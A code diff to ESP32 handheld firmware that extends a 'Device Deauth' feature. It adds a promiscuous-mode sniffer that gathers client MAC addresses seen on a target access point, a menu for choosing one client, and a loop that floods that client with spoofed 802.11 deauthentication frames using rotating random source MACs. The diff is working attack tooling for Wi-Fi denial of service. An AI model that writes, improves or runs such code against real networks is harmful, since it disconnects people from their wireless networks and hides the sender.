@@ -39,6 +39,11 @@ enum DeauthPreset {
 
 static DeauthPreset current_preset = PRESET_NORMAL;
 
+// Device deauth sniffing globals
+static std::vector<uint8_t> sniffed_clients;
+static uint8_t sniff_target_bssid[6];
+static volatile bool sniffing_active = false;
+
 /**
  * @brief Decomplied function that overrides original one at compilation time.
  *
@@ -829,6 +834,43 @@ static void deauth_preset_config(int *packets_per_mac, int *delay_ms, bool *spoo
     }
 }
 
+// Sniffer callback for device deauth
+static void device_deauth_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (!sniffing_active) return;
+    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
+    
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *frame = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+    
+    if (len < 24) return;
+    
+    // Extract source MAC (client) and destination MAC (AP)
+    const uint8_t *src_mac = &frame[10];
+    const uint8_t *dst_mac = &frame[4];
+    
+    // Check if packet is to/from our target AP
+    bool to_target = (memcmp(dst_mac, sniff_target_bssid, 6) == 0);
+    bool from_target = (memcmp(src_mac, sniff_target_bssid, 6) == 0);
+    
+    if (!to_target && !from_target) return;
+    
+    // Get the client MAC (the one that's not the AP)
+    const uint8_t *client_mac = to_target ? src_mac : dst_mac;
+    
+    // Skip broadcast, multicast, and our own MAC
+    if (client_mac[0] == 0xFF && client_mac[1] == 0xFF) return;
+    if (client_mac[0] & 0x01) return;
+    
+    // Add to list if not already present
+    for (size_t i = 0; i < sniffed_clients.size(); i += 6) {
+        if (memcmp(&sniffed_clients[i], client_mac, 6) == 0) return;
+    }
+    
+    // Add new client
+    for (int i = 0; i < 6; i++) sniffed_clients.push_back(client_mac[i]);
+}
+
 /***************************************************************************************
 ** function: target_atk
 ** @brief: Deploy Target deauth (enhanced with MAC rotation and spoofing)
@@ -1076,40 +1118,94 @@ void enhancedDeviceDeauth() {
     padprintln("Sniffing for clients on CH" + String(channel));
     padprintln("10 seconds...");
     
-    if (!initMonitorMode(channel)) {
-        displayError("Monitor mode failed", true);
-        wifi_atk_unsetWifi();
-        return;
-    }
+    // Setup sniffer
+    sniffed_clients.clear();
+    memcpy(sniff_target_bssid, target_bssid, 6);
+    sniffing_active = true;
     
-    std::vector<uint8_t> client_macs;
+    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(device_deauth_sniffer);
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    
     unsigned long start = millis();
-    tft.setCursor(20, 120);
-    tft.print("Found: 0 clients");
+    int last_count = 0;
     
     while (millis() - start < 10000) {
         if (check(EscPress)) break;
+        
+        int current_count = sniffed_clients.size() / 6;
+        if (current_count != last_count) {
+            tft.fillRect(20, 120, 150, 20, TFT_BLACK);
+            tft.setCursor(20, 120);
+            tft.print("Found: " + String(current_count) + " clients");
+            last_count = current_count;
+        }
         delay(100);
-        tft.fillRect(20, 120, 100, 20, TFT_BLACK);
-        tft.setCursor(20, 120);
-        tft.print("Found: " + String(client_macs.size() / 6) + " clients");
     }
-    esp_wifi_set_promiscuous(false);
     
-    if (client_macs.empty()) {
+    sniffing_active = false;
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    
+    if (sniffed_clients.empty()) {
         displayError("No clients found", true);
         wifi_atk_unsetWifi();
         return;
     }
     
+    // Display found clients
     drawMainBorderWithTitle("Device Deauth");
-    padprintln("Found " + String(client_macs.size() / 6) + " devices");
-    padprintln("Select target...");
-    delay(1500);
+    padprintln("Found " + String(sniffed_clients.size() / 6) + " devices");
     
-    int packets_per_mac, delay_ms;
+    // Build client list for selection
+    std::vector<String> client_list;
+    for (size_t i = 0; i < sniffed_clients.size(); i += 6) {
+        char mac[18];
+        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 sniffed_clients[i], sniffed_clients[i+1], sniffed_clients[i+2],
+                 sniffed_clients[i+3], sniffed_clients[i+4], sniffed_clients[i+5]);
+        client_list.push_back(String(mac));
+    }
+    
+    int client_selected = 0;
+    int client_last = -1;
+    while (true) {
+        if (client_selected != client_last) {
+            tft.fillRect(20, 100, tftWidth - 40, tftHeight - 150, bruceConfig.bgColor);
+            for (int i = 0; i < 5 && client_selected + i < (int)client_list.size(); i++) {
+                int y = 100 + i * 25;
+                if (i == 0) {
+                    tft.fillRect(20, y, tftWidth - 40, 20, TFT_WHITE);
+                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
+                    tft.setCursor(25, y + 5);
+                    tft.print("> ");
+                } else {
+                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+                    tft.setCursor(25, y + 5);
+                    tft.print("  ");
+                }
+                tft.print(client_list[client_selected + i]);
+            }
+            client_last = client_selected;
+        }
+        if (check(NextPress)) { client_selected++; if (client_selected >= (int)client_list.size()) client_selected = 0; delay(150); }
+        if (check(PrevPress)) { client_selected--; if (client_selected < 0) client_selected = client_list.size() - 1; delay(150); }
+        if (check(SelPress)) break;
+        if (check(EscPress)) { wifi_atk_unsetWifi(); return; }
+        delay(50);
+    }
+    
+    // Get selected client MAC
+    uint8_t target_client[6];
+    for (int i = 0; i < 6; i++) {
+        target_client[i] = sniffed_clients[client_selected * 6 + i];
+    }
+    
+    int packets_per_mac, deauth_delay_ms;
     bool spoofing;
-    deauth_preset_config(&packets_per_mac, &delay_ms, &spoofing);
+    deauth_preset_config(&packets_per_mac, &deauth_delay_ms, &spoofing);
     
     initMonitorMode(channel);
     uint8_t deauth_buf[26];
@@ -1118,20 +1214,24 @@ void enhancedDeviceDeauth() {
     unsigned long fps_timer = millis();
     
     drawMainBorderWithTitle("Device Deauth");
-    padprintln("Attacking: " + String(client_macs[0], HEX) + ":" + String(client_macs[1], HEX));
+    char mac_str[18];
+    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+             target_client[0], target_client[1], target_client[2],
+             target_client[3], target_client[4], target_client[5]);
+    padprintln("Attacking: " + String(mac_str));
     padprintln("Channel: " + String(channel));
     padprintln("Press any key to stop");
     
     while (!check(AnyKeyPress)) {
         if (packet_count % packets_per_mac == 0) {
             generateRandomMAC(spoof_mac);
-            buildDeauthFrame(deauth_buf, &client_macs[0], spoof_mac, target_bssid, 0x07, false);
+            buildDeauthFrame(deauth_buf, target_client, spoof_mac, target_bssid, 0x07, false);
         }
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_buf, 26, false);
         total_frames++;
         fps++;
         packet_count++;
-        if (delay_ms > 0) delay(delay_ms);
+        if (deauth_delay_ms > 0) delay(deauth_delay_ms);
         
         if (millis() - fps_timer > 1000) {
             tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
